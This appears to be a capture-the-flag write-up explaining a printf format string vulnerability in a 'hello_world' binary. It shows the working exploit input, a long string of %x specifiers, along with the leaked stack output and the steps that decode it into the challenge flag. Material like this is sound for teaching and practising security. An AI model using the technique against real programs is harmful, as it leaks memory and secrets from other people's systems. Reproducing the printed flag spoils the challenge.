## Solution
This is a *format string* vulnerability!

The C function `printf` is extremely powerful. In particular, it is a variable length argument function.   
Because of this, if the wrong number of parameters (for the amount of format strings specified) is put in,   
then the user can control the format string itself!  

Using this vulnerability, an arbitrary write primitive or arbitrary read primitive is possible :)  This occurs  
because of the code `printf(argv[1])`. Argv[1] is interpretted as the format string itself, allowing for us to inject  
whatever we want into the interprettation. Using `%x` allows for us to leak memory from the stack (which is where the function  
parameters for the format string are put). Because we copied the *flag* string to the stack, this we can leak the flag!   

An example execution and output is shown below: 

```
./hello_world "%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%xx%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x"

5671d330285659640a7a95344fffb4bfc40f7eca000f7f097e05671d3308887b676c66736968746565735f695f736d736f706d697373737d656c62a0031409a00ffb4bf3000f7d01ee5f7eca000f7eca0000f7d01ee52ffb4bfc4ffb4bfd0ffb4bf54f7eca000f7f0a000ffb4bfa80f7f0a9900f7eca000f7eca0000fe9af9d637d9dfc60000000f7eef17d56598fb02565961d0056596205565963b22ffb4bfc45659649056596500f7eef2d0ffb4bfbc1c2ffb4de83ffb4de910ffb4e71affb4e72affb4e750ffb4e75fffb4e774ffb4e783ffb4e795ffb4e7a2ffb4ed84ffb4ed97ffb4edcbffb4ededffb4ee04ffb4ee18ffb4ee38ffb4ee44ffb4ee5effb4ee66ffb4ee77ffb4ee96ffb4eeb8ffb4eef9ffb4ef79ffb4efafffb4efc2ffb4efd2020f7eddb4021f7edd00010178bfbff6100011643565950344205c7f7ede000809565961d0b3e8c3e8d3e8e3e817019ffb4c0eb1a01fffb4efeafffb4c0fb000e00000004c31409a2514cbf2e693f8c26952651c363836000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
```

Although this looks like a bunch of non-sense, if we change the hex to ascii (with something like https://www.rapidtables.com/convert/number/hex-to-ascii.html),   
then it looks quite a bit better! 
```
VqÓ0(VYd
z4Oÿ´¿Ä~Ê	~g3{glfsihtees_i_smsopmisss}elb 	 ûKó}î_~Ê~Ê÷Ðå/ûKüOûKýûKõO~Ê
...
```

The flag is `{glfsihtees_i_smsopmisss}elb`. However, it looks garbled. This is because of memory on x86 is arranged in little endian format and is reversed  
for strings. When we are printing this via the `%x` specifier, we are printing out hex integers. Because the formating is unexpected, it's printed out wrong.   

This means that the data is *reversed* from what is stored in memory in groups of 4. For instance, 'flg{' is the first part of the flag, then 'this'.  
At the end, the flag can be split up like so, then reversed: `{glf siht ees_ i_sm sopm isss }elb` turns into `flg{ this _see ms_i mpos sssi ible}`.   
Finally, combine the entries to get `flg{this_seems_impossssible}` for the flag. 
